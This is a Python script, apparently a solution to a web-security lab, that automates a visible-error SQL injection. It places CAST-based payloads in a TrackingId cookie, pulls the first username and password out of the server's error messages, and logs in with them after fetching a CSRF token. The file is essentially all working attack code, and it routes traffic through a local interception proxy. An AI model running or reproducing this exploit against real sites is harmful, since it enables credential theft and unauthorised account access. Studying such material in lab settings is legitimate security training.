import urllib3
import sys
import requests
from bs4 import BeautifulSoup
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def getCSRF(r):
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = '/login'
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    t = s.post(fullurl, verify=False, proxies=proxies, data=data)
    if 'Log out' in t.text:
        print('\n Login Bypassed')

    else :
        print('\n Log In bypassed failed')


def setrequiredtext(payload, fullurl):
    cookie = {
        'TrackingId': payload,
        'session': 'ibQazPibFuI0f2po9gosWPqKP2jrUWZW'
    }
    r = requests.get(fullurl, cookies=cookie, verify=False, proxies=proxies)
    if r.status_code == 500:
        soup = BeautifulSoup(r.text, 'html.parser')
        actualtext = soup.find('h4')
        requiredtext = actualtext.get_text()
        start = - len(requiredtext) + 47
        end = len(requiredtext) - 1
        thetext = requiredtext[start:end]
        return thetext

def visibleerrorsqlinjection(url):
    uri = "/"
    fullurl = url + uri
    payload = "' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--"
    username = setrequiredtext(payload, fullurl)
    payload1= "' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--"
    password = setrequiredtext(payload1, fullurl)
    login(username, password, url)

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])

    visibleerrorsqlinjection(url)
